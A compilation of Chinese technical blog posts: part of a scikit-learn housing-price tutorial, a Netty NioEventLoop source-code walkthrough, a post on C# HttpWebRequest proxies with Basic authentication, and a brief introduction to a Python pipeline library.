从这张图，信息量就大多了。首先，我们可以观察到，越靠近沿海地区(再解释一下，该数据是加利福尼亚州的房屋价格数据，因此根据美国地理位置，沿海地区一目了然)房屋价格更高，同时人口的分布大致呈两条弧线，沿海地区与内陆地区的人口分布在总体上大致保持一致。
因为数据的量不大，我们可以让计算机对数据的相关性进行一个计算。
使用corr()函数，计算各属性与房价中位数的关系。

相关性的值，越靠近1说明正相关性越强，越靠近-1说明负相关性越强，越靠近0说明两者之间没有相关性。注意，这里corr()计算的是一种线性相关关系，不是非线性相关关系。
从上图，房价中位数与收入中位数有很强的相关性。
使用Pandas中的scatter_matrix()函数可以绘制各属性之间的相关性，如果不加限制条件，函数将把所有属性与其他属性的相关关系全部计算。我们的数据中存在11个属性，因此如果不加限制条件，会绘制11*11=121个图形。选取与房价中位数直觉上最相关的属性计算，这里选取“median_income”、“total_rooms”、“housing_median_age”三个属性计算相关性:


这张图的对角线需要说明一下，因为相同的属性的相关性肯定是1，因此显示直方图。
我们重点关注一下“income_value”与“house_median_value”的关系:

从图中可以看出，在50万有一条横线，在35万、45万处好像也存在直线，我们在继续的数据处理中应该对这些点进行去除，防止系统重现这些怪异数据。
除了上述针对原属性的介绍，我们其实也可以针对属性进行组合，形成新属性。
我们从之前给出的属性，我们可以进行分析，这里再给出我们的属性:

在属性中，我们能观察到“total_bedrooms”、“total_rooms”、“population”、“households”可能存在一定联系，那么是否可以对这几个属性进行一个数据融合形成一个新属性呢？当然可以，并且有助于深刻探索数据。书中针对该方面新创新了3个属性:

上述属性含义分别是:平均每房屋的房间数、平均房间中的卧室数、平均人口持有房屋数
我们可以通过计算相关性，看看新属性对“house_median_value”的关系:

“bedrooms_per_room”与房屋中位数属性相关度比其他大部分属性高，说明新属性的创造是有效的。
五、机器学习算法的数据准备


针对给机器学习算法的数据准备，我认为有以下几个方面:

不完全数据的合理补全
非数值属性的变换
新增新属性，删除相关性差的属性
数据数值的合理化（归一化、均值化等）

从技术的角度，我们应该采用一套自动化的数据转换，而不是每次都手动转换。原因有以下几点:

可以在任意数据集上重现转换(比如：获得更新的数据库之后)
逐渐建立起一个转换函数的函数库，可重用
在实时系统中使用这些函数来转换新数据再给算法
可尝试多种转换系统，查看哪个转换组合最佳

首先，同样创建一个去除预测值的训练集（X_Train），将预测值传入新的list中(Y_train)。

准备工作完毕后，正式开始:
不完全数据的合理补全：
从之前的info()函数，我们已经得出有些数据是不全的，比如“total_bedrooms”。有三种办法对该属性值进行处理:

放弃缺失的地区
放弃该属性
将缺失值设置为某一个合理值

由于这个属性缺失数量比较小，因此打算采用第三种方式进行。
sklearn中的Imputer类可以处理该问题,首先应创建该类实例。由于这个类处理时需要纯数值的数据，因此我们要预先将非数值的数据进行删除后再做处理:

Imputer.fit()是计算各属性的策略值，并保存在imputer.statistics_中。这样做的好处就是我们不知道未来的数据中哪个部分存在缺失，我们可以针对这些缺失做出处理。
然后开始替换:

这个imputer实例将把housing_num中的缺失值替换为之前计算好的数值。转换后的X是一个numpy框架定义的数组，如果想转换为pandas的DataFrames，可以进行如下操作:

文本数据的处理：
“ocean_proximity”是一个文本属性，要变为数值属性，算法才能更好的工作。
sklearn中的LabelEncoder是实现这个功能的类。
废话不多说，直接上代码，马上就懂:

从结果可以发现，这个函数的功能是将文本集合映射为数字的过程。这个映射为:

内容和序号实现了映射，0对应‘1H OCEAN’，以此类推。
这里，我们需要考虑一个问题:映射的方式是没有错的，但是毕竟是数值，数值就存在大小，从数值上说1就是比4小，因此这个差异可能会导致学习算法的精准度，因此采用one-hot编码更好些！如果不晓得，请点此链接查询。
sklearn类提供了一个OneHotEncoder类来提供此服务。
先上代码，然后解释:

reshape()函数是将numpy数组的形状进行转换，这里的-1需要解释一下:一个参数为-1时，那么reshape函数会根据另一个参数的维度计算出数组的另外一个shape属性值。
fit_transform()函数是将fit()函数和transform()函数结合的函数，它的作用是先将数据做规则的操作，然后再对数据转换为标准形式。
housing_cat_1hot将会转变为一个scipy的矩阵，是一个稀疏的矩阵。当然如果需要转换为numpy类型的矩阵，只需要做如下操作:

toarray()函数可以转为numpy类型的数组。
LabelBinarizer类可以将上述两个步骤合并，同时通过传送sparse_output=True给LabelBinarizer类的构造函数可以获得稀疏矩阵。

 
自定义转换器：
这个步骤的意义在于，使用框架中的方法总不能很好的契合我们的实际需要，我们可以利用框架中的方法，通过自己定义转换器，将框架中的方法最有效的利用到我们的转换器中，这样可以节省很多时间！
先上代码，再分析:

我们首先要明白一个概念，然后再来解释为什么要这样做，这个概念是鸭子类型，不懂的小伙伴请点击链接看一下含义。
这个类是组合属性添加类，参数是基本估计器和转换估计器，这里给个链接，需要的朋友们去链接里面看一下这两个东西是啥。首先我们知道数据属性的顺序，因此可以直接预定义需要查找到每个属性的索引序号，room_ix,bedroom_ix等都是其索引序号。然后是__init__()函数，这个是构造函数，用来初始化某个需要的属性标识，默认为Ture(也就是默认是要添加的！)。定义fit()函数，将参数self、X(外部传递的参数)传递给它，同时返回的self是一个具有fit()函数处理过的结果。设置transform()函数，同样将参数传递给它。这个函数就会根据我们在构造函数中传入的参数add_bedrooms_per_room的true或者False来判断是否需要添加这个属性，如果不添加，我们就只会添加rooms_per_household与population_per_household两个属性。np.c_函数是按行连接两个矩阵，就是把两矩阵左右相加，要求行数相等。至此，类的设置就完毕了。
CombineAttributesAdder()这个就是初始化我们的类，并且给这个类提供参数，如果不填则默认需要添加add_bedrooms_per_room这个属性。最后，使用类中transform()函数，将属性添加进来得到一个新的添加了新属性的矩阵。
 
特征缩放：
如果数据大小存在非常明显的差异，那么有可能会导致机器学习算法性能不佳。同比例的缩放所有属性有两种常用的方法:最大最小缩放和标准化。

最大最小缩放

将值重新缩放使其最终范围归于0到1之间，实现方法是将值减去最小值并除以最大值和最小值的差。我们可以用sklearn中的MinMaxScaler的转换器，当然不想范围是0-1可以通过传递超参数feature_range进行更改。

标准化

首先减去平均值，除以方差，使得结果的分布具有单位方差。可以使用standadScaler()函数。
标准化并不会将结果绑定到一个范围中，有可能不适合某些对输入数据有要求的处理，但是它相比上一个缩放方式，受到异常值的影响更小，比如假设某地区平均收入是1000（这是一个错误数据），缩放就会将所有数据从0-15降到0-0.015，影响较大，但如果是标准化，异常值不会干扰其他正常数据。
具体使用见下面部分！
 
转换流水线：
sklearn有一个很好的思想就是将转换操作工厂流水线化，它有一个非常nice的类，叫做Pipeline类，这个类可以帮我们实现对数据集处理的自动化操作！
Pipeline类的构造函数会通过一系列的名称/估算器的配对来定义步骤序列。先上代码：

这一步可能会有很多童鞋报错，有的会说缺少sklearn_features的包，有的会报参数个数的错误，这里副个链接，有问题请点击这个链接。
除了导入了需要的包之外，我们首先看到定义了两个参数，一个是list类型的数值文本属性名称()，一个是类别参数，因为这里只有“ocean_proximity”这个属性是文本属性，因此我们只将这个属性赋值给cat_attribs中。
首先，要先自定义一下这个DataFrameSelector，先给出代码:

这里给出的就是按照参数给出的数值属性进行转换。
接下来开始定义Pipeline，我们只需要在构造方法中传入我们需要的顺序即可。比如num_pipeline，在构造函数中传入我们需要执行的函数DataFrameSelector()、Imputer()、CombineAttributesAdders()、StandardScaler()，同样方法可对其他的流水线进行了定义。
每一条子流水线都是从选择器转换器开始，然后挑出所需属性(数值或者分类)，生成的DataFrame再转换为numpy数组就可以进行训练了。
至此，针对算法的数据准备基本到此告一段落。
 
六、选择和训练模型
在这个阶段，应该做的就是选择一个合适的模型，训练该模型，并评估预测的质量了。
首先可以尝试选择一个线性回归模型。

代码怎么用，这里不解释了，看代码就知道了。这里通过fit()函数后，lin_reg就是我们通过训练集得出的第一个训练模型，接下来可以通过predict来进行预测。我们可以通过训练集的一些数据进行:

我们从总数据中选出五个数据进行测试，虽然测试结果不尽如人意，但是系统可以工作了，这个还是很让人兴奋的！
那么，怎么评估算法的性能呢？我们使用RMSE。

从之前的数据中，大多地区的房价中位数在12万美元到26万美元之间，我们的预测基本与之相差6万8的误差，说明我们的系统对数据拟合存在严重不足。当这种情况发生时，可能是由于特征信息不能提供足够的信息让我们做出更好的预测还有就是算法不够强大。因此到了这一步，你就有两种选择，一个是需要更多新属性来支持算法，还有一个就是选择更强大的模型或者减少模型约束(当然，我们选择的线性模型没有什么约束，谈不上这一点…)。
我们用更强大的算法试试！
用决策树模型，试试效果:

我擦，RMSE最后的结果竟然为0？！完美的算法？of course not! 很大程度上，不存在完美的算法，应该是数据严重过拟合了。。。
用K折交叉验证的方式，能够还原算法的本来面貌。
交叉验证，说白了就是将训练集科学分成K份，每次选择1份做验证集，其他为训练集，分别训练K次，选出性能最好的模型作为最后的模型:

这里从cross_val_score的参数中可以发现，第一个参数是模型，第二个参数是训练集，第三个参数是标签，第四个参数是选择打分类型，第五个参数是选择那个K，最后得出的score就是一个K大小的数组，每个里面放着一次的得分。
从结果上看，平均得分在69549，上下浮动2000左右。
我们再看看线性回归模型:

线性回归跑分是69088，比决策树稍差。
我们最后再看看随机森林模型。

随机森林模型显然不如决策树模型。
 
我们尝试了很多种不同的模型，原因是在这个阶段我们需要尝试不同模型，选出其中有潜力的模型，千万不要花太多时间去调整每个模型的超参数，确定要使用的模型才是这个阶段最关键的！
至于模型的过拟合问题或者其他什么问题，我们等确定模型后再调试即可。
每个模型都应该妥善的保存，这里介绍一个python中的pickel模块或者sklearn.externals的joblib模块:

 
七、微调模型
假设，你现在已经确定了好几个有潜力的模型，那么这时候需要微调它们了。
微调的一个方法是对模型的超参数进行调整，这个过程很耗时，你需要科学的工具帮助你。使用sklearn中的GridSearchCV来帮助你。

这里面param_grid首先评估第一个dict中的n_estimator和max_features的所有可能的组合(3*4=12)，然后尝试第二个dict中的参数组合(2*3=6)。最后需要尝试6+12=18种组合，并对每个模型进行5次训练。当运行完毕后，可获得最佳参数组合：

同时，我可以得到最好的估算器:

评估分数也可以得出:

对了，有些数据准备也可以当作超参数来处理，比如之前的自定义转换器中是否添加“add_bedrooms_per_room”。
当然若超参数数量非常大，一般选择RandomizedSearchCV，这个函数会在每次迭代中为每个超参数随机选择一个值，对一定数量的迭代进行评估，这里不详细介绍了，具体请Google。
检查最佳模型，我们还可以得出每个属性的相对重要程度:

说明一下最下面那个array[]是之前的ocean_proximity属性。
 
好了，我们微调过后，通过测试集评估系统吧。

这个结果比之前就好多了！
 
八、展示解决方案
这里可以通过制作PPT等方式，强调系统学习到了什么、什么属性是有用的、算法基于了什么假设、系统目前存在的限制有什么，用清晰可视化的方式呈现！
九、启动、监控和维护系统
这里就是即将让项目进入实战的环节，这时候应该为生产环境做准备，特别是将生产数据接入系统，当然为了防止出错，我们必须要进行代码测试！
监控代码也要编写，这是为了定期检查系统的实时性能，在性能下降后触发警报！
任何模型几乎都经不起时间的演化，随着时间的演化，适合现阶段的参数可能不是该模型存在的参数，模型会渐渐“腐化”,所以我们应该定期使用新的数据训练模型，让模型保持年轻。同时做好模型备份，防止最新迭代的模型出现错误好马上回滚。
还要注意的是，模型的预测结果需要专家进行分析，确保环节安全。
最后要注意的是要监控输入系统的数据的质量，及时查找出质量较差的数据，防止污染系统。
 
好啦，我的心得在这里就算总结完毕了。这个总结对我来说，我又重新认识了一遍项目的流程，这个对我收益很大，以后要多多坚持自己的总结，加油呀！
 
图中代码可通过以下方式获得：
1、我的Github：https://github.com/niufuquan1/MyStudy_For_sklearn_tensorflow
2、百度云分享：https://pan.baidu.com/s/1xjBGBFbM7hqp-tUO3oNEtA (sio0)
 
转载请注明出处，谢谢！
有任何问题，请在下方留言，博主看到会进行回复。



https://www.cnblogs.com/nfuquan/p/10567842.html
**************************************************
Netty源码分析之NioEventLoop(二)—NioEventLoop的启动
上篇文章中我们对Netty中NioEventLoop创建流程与源码进行了跟踪分析。本篇文章中我们接着分析NioEventLoop的启动流程；
Netty中会在服务端启动和新连接接入时通过chooser选择器，分别为NioServerSocketChannel与NioSocketChannel选择绑定一个NioEventLoop，接下来我们就分别从这两个方面梳理NioEventLoop的启动源码
一、服务端启动
首先我们结合下图看下Netty服务启动过程中，NioServerSocketChannel绑定的NioEventLoop启动流程

bind()部分源码我们在之前服务端启动过程中进行过说明，我们进一步跟踪进入doBind0()方法中可以看到channel.eventLoop().execute的执行，需要说明的是这里其实启动的NioServerSocketChannel绑定的 bossGroup，用来负责处理新连接接入的。

    /**
     * read by jsf
     * 
     * @param regFuture
     * @param channel
     * @param localAddress
     * @param promise
     */
    private static void doBind0(final ChannelFuture regFuture, final Channel channel, final SocketAddress localAddress,
            final ChannelPromise promise) {
        //该方法向 NioServerSocketChannel 的 eventLoop 提交了一个任务，当 future(其实就是 promise) 成功后执行
        //NioServerSocketChannel 的 bind 方法，并添加一个关闭监听器。我们主要关注 bind 方法。
        // This method is invoked before channelRegistered() is triggered. Give user
        // handlers a chance to set up
        // the pipeline in its channelRegistered() implementation.
        channel.eventLoop().execute(new Runnable() {
            @Override
            public void run() {
                if (regFuture.isSuccess()) {
                    
                    channel.bind(localAddress, promise).addListener(ChannelFutureListener.CLOSE_ON_FAILURE);
                } else {
                    promise.setFailure(regFuture.cause());
                }
            }
        });
    }

进入NioEventLoop父类SingleThreadEventExecutor中的execute方法，改方法通过inEventLoop()会首先判断当前的线程是否是NioEventLoop本身绑定的线程，结合inEventLoop的代码可以看到NioEventLoop本身线程还未初始化为空，这里返回false，执行启动线程操作，同时会任务放入任务队列中。

    @Override
    public void execute(Runnable task) {
        if (task == null) {
            throw new NullPointerException("task");
        }

        //首先判断当前线程是否是该EventLoop绑定的线程
        boolean inEventLoop = inEventLoop();
        //把传入的任务加入任务对立
        addTask(task);
        if (!inEventLoop) {//如果不是同一条线程
            startThread();
            if (isShutdown() && removeTask(task)) {
                reject();
            }
        }

        if (!addTaskWakesUp && wakesUpForTask(task)) {
            wakeup(inEventLoop);
        }
    }


    @Override
    public boolean inEventLoop(Thread thread) {
        return thread == this.thread;
    }

 继续跟踪进入startThread()方法中

    private void startThread() {
        if (state == ST_NOT_STARTED) {
            if (STATE_UPDATER.compareAndSet(this, ST_NOT_STARTED, ST_STARTED)) {
                try {
                    doStartThread();
                } catch (Throwable cause) {
                    STATE_UPDATER.set(this, ST_NOT_STARTED);
                    PlatformDependent.throwException(cause);
                }
            }
        }
    }

 在 doStartThread()中主要实现了以下功能：
1、执行传入的ThreadPerTaskExecutor的execute方法，创建一个新的线程，并与这个NioEventLoop对象绑定；
2、在开启的线程中执行SingleThreadEventExecutor.this.run()，也就是NioEventLoop的run方法，开始NioEventLoop的执行操作；

    private void doStartThread() {
        assert thread == null;
        //线程执行器通过线程工厂创建线程
        executor.execute(new Runnable() {
            @Override
            public void run() {
                //开启线程，并赋值
                thread = Thread.currentThread();
                if (interrupted) {
                    thread.interrupt();
                }

                boolean success = false;
                updateLastExecutionTime();
                try {
                    //执行NioEventLoop的run方法
                    SingleThreadEventExecutor.this.run();
                    success = true;
                } catch (Throwable t) {
                    logger.warn("Unexpected exception from an event executor: ", t);
                } finally {
                    for (;;) {
                        int oldState = state;
                        if (oldState >= ST_SHUTTING_DOWN || STATE_UPDATER.compareAndSet(
                                SingleThreadEventExecutor.this, oldState, ST_SHUTTING_DOWN)) {
                            break;
                        }
                    }

                    // Check if confirmShutdown() was called at the end of the loop.
                    if (success && gracefulShutdownStartTime == 0) {
                        if (logger.isErrorEnabled()) {
                            logger.error("Buggy " + EventExecutor.class.getSimpleName() + " implementation; " +
                                    SingleThreadEventExecutor.class.getSimpleName() + ".confirmShutdown() must " +
                                    "be called before run() implementation terminates.");
                        }
                    }

                    try {
                        // Run all remaining tasks and shutdown hooks.
                        for (;;) {
                            if (confirmShutdown()) {
                                break;
                            }
                        }
                    } finally {
                        try {
                            cleanup();
                        } finally {
                            STATE_UPDATER.set(SingleThreadEventExecutor.this, ST_TERMINATED);
                            threadLock.release();
                            if (!taskQueue.isEmpty()) {
                                if (logger.isWarnEnabled()) {
                                    logger.warn("An event executor terminated with " +
                                            "non-empty task queue (" + taskQueue.size() + ')');
                                }
                            }

                            terminationFuture.setSuccess(null);
                        }
                    }
                }
            }
        });
    }

OK到这一步，基于服务端启动绑定端口的NioServerSocketChannel，也就是服务端Channel绑定的NioEventLoop已经启动。
二、新连接接入
首先我们结合下图看下当有客户端接入时，创建NioSocketChannel，然后绑定NioEventLoop并启动的流程

服务端启动时会在NioServerSocketChannel的任务链中添加ServerBootstrapAcceptor对象，这就是用来处理新新连接接入的

        p.addLast(new ChannelInitializer<Channel>() {
            @Override
            public void initChannel(final Channel ch) throws Exception {
                final ChannelPipeline pipeline = ch.pipeline();
                ChannelHandler handler = config.handler();
                if (handler != null) {
                    pipeline.addLast(handler);
                }

                // 服务端NioServerSocketChannel的pipeline中添加ServerBootstrapAcceptor
                ch.eventLoop().execute(new Runnable() {
                    @Override
                    public void run() {
                        pipeline.addLast(new ServerBootstrapAcceptor(
                                ch, currentChildGroup, currentChildHandler, currentChildOptions, currentChildAttrs));
                    }
                });
            }
        });

在新连接接入事件触发时，执行unsafe.read();

   private void processSelectedKey(SelectionKey k, AbstractNioChannel ch) {
        final AbstractNioChannel.NioUnsafe unsafe = ch.unsafe();
        if (!k.isValid()) {
            final EventLoop eventLoop;
            try {
                eventLoop = ch.eventLoop();
            } catch (Throwable ignored) {
                // If the channel implementation throws an exception because there is no event loop, we ignore this
                // because we are only trying to determine if ch is registered to this event loop and thus has authority
                // to close ch.
                return;
            }
            // Only close ch if ch is still registered to this EventLoop. ch could have deregistered from the event loop
            // and thus the SelectionKey could be cancelled as part of the deregistration process, but the channel is
            // still healthy and should not be closed.
            // See https://github.com/netty/netty/issues/5125
            if (eventLoop != this || eventLoop == null) {
                return;
            }
            // close the channel if the key is not valid anymore
            unsafe.close(unsafe.voidPromise());
            return;
        }

        try {
            int readyOps = k.readyOps();
            // We first need to call finishConnect() before try to trigger a read(...) or write(...) as otherwise
            // the NIO JDK channel implementation may throw a NotYetConnectedException.
            if ((readyOps & SelectionKey.OP_CONNECT) != 0) {
                // remove OP_CONNECT as otherwise Selector.select(..) will always return without blocking
                // See https://github.com/netty/netty/issues/924
                int ops = k.interestOps();
                ops &= ~SelectionKey.OP_CONNECT;
                k.interestOps(ops);

                unsafe.finishConnect();
            }

            // Process OP_WRITE first as we may be able to write some queued buffers and so free memory.
            if ((readyOps & SelectionKey.OP_WRITE) != 0) {
                // Call forceFlush which will also take care of clear the OP_WRITE once there is nothing left to write
                ch.unsafe().forceFlush();
            }

            // Also check for readOps of 0 to workaround possible JDK bug which may otherwise lead
            // to a spin loop
            //新连接接入
            if ((readyOps & (SelectionKey.OP_READ | SelectionKey.OP_ACCEPT)) != 0 || readyOps == 0) {
                unsafe.read();
            }
        } catch (CancelledKeyException ignored) {
            unsafe.close(unsafe.voidPromise());
        }
    }

unsafe.read()的具体实现为NioMessageUnsafe中的read()，在read()方法中主要实现了两个功能：
1、创建客户端Channel，也就是NioSocketChannel；
2、开始服务端NioServerSocketChannel的任务链传递，首先执行之前已经加入任务链的ServerBootstrapAcceptor中的channelRead

        @Override
        public void read() {
            assert eventLoop().inEventLoop();
            final ChannelConfig config = config();
            final ChannelPipeline pipeline = pipeline();
            final RecvByteBufAllocator.Handle allocHandle = unsafe().recvBufAllocHandle();
            allocHandle.reset(config);

            boolean closed = false;
            Throwable exception = null;
            try {
                try {
                    do {
                        //这里创建客户端连接,也就是NioSocketChannelChannel
                        int localRead = doReadMessages(readBuf);
                        if (localRead == 0) {
                            break;
                        }
                        if (localRead < 0) {
                            closed = true;
                            break;
                        }

                        allocHandle.incMessagesRead(localRead);
                    } while (allocHandle.continueReading());
                } catch (Throwable t) {
                    exception = t;
                }

                int size = readBuf.size();
                for (int i = 0; i < size; i ++) {
                    readPending = false;
                    //在这里开始NioServerSocketChannel的任务链传递，会首先执行ServerBootstrapAcceptor中的channelRead
                    pipeline.fireChannelRead(readBuf.get(i));
                }
                readBuf.clear();
                allocHandle.readComplete();
                pipeline.fireChannelReadComplete();

                if (exception != null) {
                    closed = closeOnReadError(exception);

                    pipeline.fireExceptionCaught(exception);
                }

                if (closed) {
                    inputShutdown = true;
                    if (isOpen()) {
                        close(voidPromise());
                    }
                }
            } finally {
                // Check if there is a readPending which was not processed yet.
                // This could be for two reasons:
                // * The user called Channel.read() or ChannelHandlerContext.read() in channelRead(...) method
                // * The user called Channel.read() or ChannelHandlerContext.read() in channelReadComplete(...) method
                //
                // See https://github.com/netty/netty/issues/2254
                if (!readPending && !config.isAutoRead()) {
                    removeReadOp();
                }
            }
        }

接下来在ServerBootstrapAcceptor中的channelRead中会获取到传入的NioSocketChannel，针对NioSocketChannel主要会执行以下操作：
1、配置childHandler任务链；
2、配置childOptions；
3、为NioSocketChannel分配NioEventLoop

        @Override
        @SuppressWarnings("unchecked")
        public void channelRead(ChannelHandlerContext ctx, Object msg) {
            final Channel child = (Channel) msg;

            //配置childHandler任务链
            child.pipeline().addLast(childHandler);


            //配置childOptions
            setChannelOptions(child, childOptions, logger);

            for (Entry<AttributeKey<?>, Object> e: childAttrs) {
                child.attr((AttributeKey<Object>) e.getKey()).set(e.getValue());
            }

            try {
                //为新连接分配NioEventLoop，并启动执行
                childGroup.register(child).addListener(new ChannelFutureListener() {
                    @Override
                    public void operationComplete(ChannelFuture future) throws Exception {
                        if (!future.isSuccess()) {
                            forceClose(child, future.cause());
                        }
                    }
                });
            } catch (Throwable t) {
                forceClose(child, t);
            }
        }

看以看到EventLoopGroup中register具体实实现：
1、关于next()，我们之前讲过是专门用来分配NioEventLoop；
2、register()主要负责了EventLoop的绑定和启动；

   @Override
    public ChannelFuture register(ChannelPromise promise) {
        return next().register(promise);
    }


        @Override
        public final void register(EventLoop eventLoop, final ChannelPromise promise) {
            if (eventLoop == null) {
                throw new NullPointerException("eventLoop");
            }
            if (isRegistered()) {
                promise.setFailure(new IllegalStateException("registered to an event loop already"));
                return;
            }
            if (!isCompatible(eventLoop)) {
                promise.setFailure(
                        new IllegalStateException("incompatible event loop type: " + eventLoop.getClass().getName()));
                return;
            }

            //与NioEventLoop绑定
            AbstractChannel.this.eventLoop = eventLoop;

            //首先判断线程是否一致,当前线程是NioServerSocketChannel的线程,与当前创建NioSocketChannel的eventLoop线程不一致
            if (eventLoop.inEventLoop()) {
                register0(promise);
            } else {
                try {
                    //在这里NioEventLoop启动
                    eventLoop.execute(new Runnable() {
                        @Override
                        public void run() {
                            register0(promise);
                        }
                    });
                } catch (Throwable t) {
                    logger.warn(
                            "Force-closing a channel whose registration task was not accepted by an event loop: {}",
                            AbstractChannel.this, t);
                    closeForcibly();
                    closeFuture.setClosed();
                    safeSetFailure(promise, t);
                }
            }
        }

上面代码中的 eventLoop.execute我们已经分析过，经过一系列的流程，最后会执行NioEventLoop的run方法开始轮询感兴趣的IO事件。
 以上我们主要从服务启动与客户端连接两个方面分析了NioEventLoop的启动流程与源码，其实也就对应NioServerSocketChannel与NioSocketChannel分别绑定的NioEventLoop，其中有错误和不足之处还请指正与海涵。
https://www.cnblogs.com/dafanjoy/p/10507393.html
**************************************************
C# 使用 Proxy 代理请求资源
C# 使用 Proxy 请求资源，基于 HttpWebRequest 类
前言
这是上周在开发 C# 中使用 Proxy 代理时开发的一些思考和实践。主要需求是这样的，用户可以配置每次请求是否需要代理，用户可以配置 HTTP代理，HTTPS代理和代理白名单。
还是太年轻
因为一直用的C# 网络库中的HttpWebRequest，所以自然而然先去找找看这个网络库有没有封装好我所需要的代理呀。果不其然，被我找到了。自从上次发现某些类对老版本不兼容后，每次在微软官方文档上找到都会翻到最后，查看一下支持的最低框架。



我需要的就是这个 Proxy 属性，也就是说我最终在发送请求前，设置好这个 Proxy 属性就可以了。先去看看 Proxy 类

The IWebProxy object to use to proxy the request. The default value is set by calling the Select property.

这样的意思就是说我只要构造一个WebProxy，然后赋值给 HttpWebRequest.Proxy就可以了。
看到了WebProxy 的构造器，马上锁定了



因为我需要用户传的是 string ，所以直接这样构造就可以了。然后就是测试了，主管大佬写的 Node.js的Proxy代理 o_o 先来测试测试
npm install o_o -g

o_o
这样就启动全局安装并启动了代理，在控制台上可以看到监听的是 8989 端口



 [Fact]
public void HttpProxy()
{
    var request = new DescribeAccessPointsRequest();
    client.SetHttpProxy("http://localhost:8989");

    var response = client.GetAcsResponse(request);
    Assert.NotNull(response.HttpResponse.Content);

    var expectValue = "HTTP/1.1 o_o";
    string actualValue;
    response.HttpResponse.Headers.TryGetValue("Via", out actualValue);
    Assert.Equal(expectValue, actualValue);
}
如果经过了代理，头部会出现 "HTTP/1.1 o_o" 字段 ，经过FT测试，是成功的。
本来一切都没有问题的，除了我自己想的比较简单外，直到我 Code Review 了一下组里开发JAVA 的人实现这个功能的 Pull Request ，我才发现我还真的是想的太简单！！！
开始重构
首先发现的一点是，我连Constructor都用错了，用ILSpy反编译了一下，发现WebProxy(string,bool,string[])所作的事。
// System.Net.WebProxy
private static Uri CreateProxyUri(string address)
{
    if (address == null)
    {
        return null;
    }
    if (address.IndexOf("://") == -1)
    {
        address = "http://" + address;
    }
    return new Uri(address);
}
即使传进去的是string，最后也是构造成 Uri， 为什么会关注的这个呢？因为我发现有些Proxy地址是
http://username:password@localhost:8989 长这样的，那么我如果直接以这种形式传入到CreateProxy里面，它会自动给我分解，然后分Credential和 proxy 传入到网络库中吗？接下来就是验证的过程。
首先需要了解到的一个概念：Basic access authentication

In the context of an HTTP transaction, basic access authentication is a method for an HTTP user agent (e.g. a web browser) to provide a user name and password when making a request. In basic HTTP authentication, a request contains a header field of the form Authorization: Basic <credentials>, where credentials is the base64 encoding of id and password joined by a colon.
It is specified in RFC 7617 from 2015, which obsoletes RFC 2617 from 1999.

由于其不安全性，已在 RFC 中弃用了，转而代之的是 TLS SSL 那些协议。
问题来了， HttpWebRequest 中支持Basic Authentication吗？我们可以看到WebProxy中有一个构造方法最后一个参数是 ICredential 的

是的，就是它，知道前因后果和不足后，我继续去重构 Http Proxy 的代码：
originProxyUri = new Uri(proxy);
if (!String.IsNullOrEmpty(originProxyUri.UserInfo))
{
    authorization = Convert.ToBase64String(System.Text.Encoding.GetEncoding("ISO-8859-1").GetBytes(originProxyUri.UserInfo));
    finalProxyUri = new Uri(originProxyUri.Scheme + "://" + originProxyUri.Authority);
    var userInfoArray = originProxyUri.UserInfo.Split(':');
    credential = new NetworkCredential(userInfoArray[0], userInfoArray[1]);

    httpRequest.WebProxy = new WebProxy(finalProxyUri, false, noProxy, credential);
}
先拆分出 UserInfo Credential 和 Uri信息，然后分别重新构造相应的类型传入到 WebProxy 中。上面也有一个坑，我之前还想用正则把username和password 分别提取出去了，没想到 Uri 已经封装好了，直接取里面的userinfo 信息。哈哈，省力了。
StackOverFlow上也有挺多关于如何传入 Credential 到Proxy中，基本上用的也是这个方法，按理说这样就完事了，直到我做了测试，我发现微软这个Credential根本没有起作用，如果是正确的话，会在 HEADER 中添加
Authorization: Basic <credentials> ，和上面那段测试代码一样，
[Fact]
public void HttpProxyWithCredential()
{
    DescribeAccessPointsRequest request = new DescribeAccessPointsRequest();
    client.SetHttpProxy("http://username:password@localhost:8989");
    var response = client.GetAcsResponse(request);

    var expectValue = "HTTP/1.1 o_o";
    string actualValue;
    response.HttpResponse.Headers.TryGetValue("Via", out actualValue);

    Assert.Equal(expectValue, actualValue);
    Assert.NotNull(response.HttpResponse.Content);
}
我去测试了发现，这个头部里面根本没有加这个 Authorization 属性啊，尴尬了，是官方文档坑还是我使用不正确呢，基于此，想到了之前 主管 开发的那个 Proxy 代理 o_o ，我又去找了一个验证 basic-auth 的node.js 代理服务器 basic-auth
npm install basic-auth
var http = require('http')
var auth = require('basic-auth')
var compare = require('tsscmp')

// Create server
var server = http.createServer(function (req, res) {
  var credentials = auth(req)

  // Check credentials
  // The "check" function will typically be against your user store
  if (!credentials || !check(credentials.name, credentials.pass)) {
    res.statusCode = 401
    res.setHeader('WWW-Authenticate', 'Basic realm="example"')
    res.end('Access denied')
  } else {
    res.end('Access granted')
  }
})

// Basic function to validate credentials for example
function check (name, pass) {
  var valid = true

  // Simple method to prevent short-circut and use timing-safe compare
  valid = compare(name, 'john') && valid
  valid = compare(pass, 'secret') && valid

  return valid
}

// Listen
server.listen(3000)
将上面那段 Js代码打包成一个 js文件，然后执行
node tets.js
该代理服务器监听 3000端口，我使用刚才那段代码，果不其然，返回的是 401 ，这不是坑吗，官方文档上这样说可以，然而都不行。
最后只能强制加上这个 Authorization 代码
originProxyUri = new Uri(proxy);
if (!String.IsNullOrEmpty(originProxyUri.UserInfo))
{
    authorization = Convert.ToBase64String(System.Text.Encoding.GetEncoding("ISO-8859-1").GetBytes(originProxyUri.UserInfo));
    finalProxyUri = new Uri(originProxyUri.Scheme + "://" + originProxyUri.Authority);
    var userInfoArray = originProxyUri.UserInfo.Split(':');
    credential = new NetworkCredential(userInfoArray[0], userInfoArray[1]);

    httpRequest.WebProxy = new WebProxy(finalProxyUri, false, noProxy, credential);
    httpRequest.Headers.Add("Authorization", "Basic " + authorization);                    
}

最后在测试经过 3000 端口的代理服务器，确认是没问题的，把问题想得简单的结果就是发了一个新版本后，还没有下载，然而已经发了新版本说，用户您好，我们又有新版本了。尴尬。需要以此为鉴啊。
后记
姜还是老的辣，多看看别人的代码，来发现自己的不足。勤加练习！

https://www.cnblogs.com/xiyin/p/10583787.html
**************************************************
Easy Pipeline，一种轻量级的Python Pipeline库

嗯，很久没有写博客了，最近的工作都是偏开发性质的，以至于没有时间对自己感兴趣的领域进行探索，感觉个人的成长停滞了一些。如何在枯燥的工作中，提取出有助于自己成长的养分，对于每个人来说都是不小的考验。
 
这次，带来的是之前编写的一下挺简单的库，用来简化流水线作业的小框架。
 
Github: https://github.com/miaoerduo/easy-pipeline 欢迎Star和提交MR。
 
